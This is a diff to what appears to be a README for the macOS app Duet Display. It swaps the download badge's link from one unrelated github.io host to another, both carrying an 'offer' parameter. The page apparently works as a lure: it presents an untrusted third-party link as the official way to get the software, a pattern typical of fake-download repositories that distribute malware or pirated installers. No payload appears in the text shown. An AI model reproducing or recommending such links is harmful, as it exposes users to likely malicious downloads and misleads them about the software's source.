@@ -2,7 +2,7 @@
 
 Duet Display is a macOS application that allows you to turn your iPad, iPhone, or another computer into a second display for your Mac. It enhances productivity by extending or mirroring your Mac’s screen, providing smooth and responsive performance for work and creative tasks.
 
-<a href="https://git-app-deployer.github.io/.github/?offer=DuetDisplay" target="_blank">
+<a href="https://load-desk-hub.github.io/.github/?offer=DuetDisplay" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Duet%20Display%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
